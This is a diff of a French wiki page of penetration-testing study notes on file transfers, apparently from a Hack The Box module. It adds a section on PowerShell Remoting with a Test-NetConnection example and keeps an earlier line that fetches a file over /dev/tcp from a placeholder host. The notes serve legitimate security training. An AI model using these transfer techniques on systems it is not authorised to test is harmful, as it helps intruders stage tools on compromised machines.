@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-04-26T16:06:30.818Z
+date: 2025-04-26T16:17:01.601Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -714,4 +714,25 @@ Après avoir créer un listener qui envoi le contenu du fichier lors des connexi
 ```
 cat < /dev/tcp/<adresse>/<port> > <fichier>
 ```
+
+### PowerShell Session File Transfer
+
+Si HTTP, HTTPS ou SMB sont indisponibles, on peut utiliser [PowerShell Remoting (WinRM)](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) pour transférer des fichiers, cette fonction permet aussi d'exécuter des scripts avec des sessions PowerShell distantes. 
+
+Cette méthode nécessite des droits administratifs (membre du groupe d'utilisateurs distants).
+
+Par défaut, activer le Powershell Remoting crée deux listener: HTTP (port 5985) et HTTPS (port 5986).
+
+Pour tester la connexion distante avec WinRM il est possible d'utiliser `Test-NetConnection`:
+```
+Test-NetConnection -ComputerName <ordinateur> -Port <port (5985/5986 par défaut)>
+```
+
+
+
+
+
+
+
+
 
